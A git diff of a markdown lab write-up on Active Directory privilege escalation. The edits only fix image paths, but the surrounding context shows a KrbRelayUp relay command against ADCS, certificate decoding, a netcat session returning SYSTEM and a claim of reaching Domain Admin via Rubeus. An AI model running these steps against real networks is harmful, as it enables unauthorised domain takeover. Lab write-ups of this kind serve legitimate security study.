@@ -12,7 +12,7 @@ I have working creds for john who is a normal user without any dangerous rights 
 .\KrbRelayUp.exe relay -d lab.local -dc DC1.lab.local -m adcs
 ```
 
-![Using relay options of KrbRelayUp](KrbRelayUp.png)
+![Using relay options of KrbRelayUp](images/KrbRelayUp.png)
 
 ```bash
 echo "base64 certificate" | base64 -d > cert.pfx
@@ -87,7 +87,7 @@ connect to [192.168.10.11] from (UNKNOWN) [192.168.10.12] 58176
 whoami
 autorite nt\syst?me
 ```
-![S4U2Self](S4U2Self.png)
+![S4U2Self](images/S4U2Self.png)
 
 ## Now lets become domain admins :
 
@@ -176,7 +176,7 @@ C:\Windows\system32>
 
 We are now **Domain Admins** !!!!
 
-![Domains Admins](Rubeus.png)
+![Domains Admins](images/Rubeus.png)
 
 
 
